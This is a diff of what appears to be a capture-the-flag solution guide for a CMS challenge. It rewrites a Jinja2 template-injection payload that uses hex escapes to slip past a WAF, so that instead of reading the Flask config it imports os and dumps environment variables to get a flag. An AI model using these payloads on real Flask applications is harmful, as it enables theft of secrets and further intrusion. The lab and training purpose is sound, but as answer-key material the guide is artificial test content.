@@ -101,17 +101,19 @@ curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
 {{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
 ```
 
-**Step 2: Access Flask config through WAF bypass** -- import `flask`, get `current_app.config`:
+**Step 2: Access `os.environ` through the WAF bypass** -- import `os`, dump environment variables:
 
 ```
-{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('flask')|attr('current_app')|attr('\x63onfig')}}
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('environ')}}
 ```
 
-The output contains `WAF_SECRET_FLAG: durham-cms-flag3{...}`.
+The output contains `WAF_FLAG3: durham-cms-flag3{...}`.
 
-**Hex encoding key:** `__` -> `\x5f\x5f`, `builtins` -> `\x62uiltins`, `import` -> `\x69mport`, `config` -> `\x63onfig`
+Note: Flag 3 is stored in `os.environ['WAF_FLAG3']` — it does **not** appear in `{{config}}` on the unfiltered v1 endpoint. Players must use the WAF bypass to reach it.
 
-**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `app.config['WAF_SECRET_FLAG']`, see flags.json)*
+**Hex encoding key:** `__` -> `\x5f\x5f`, `builtins` -> `\x62uiltins`, `import` -> `\x69mport`, `os` -> `\x6f\x73`
+
+**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `os.environ['WAF_FLAG3']`, see flags.json)*
 
 ---
 
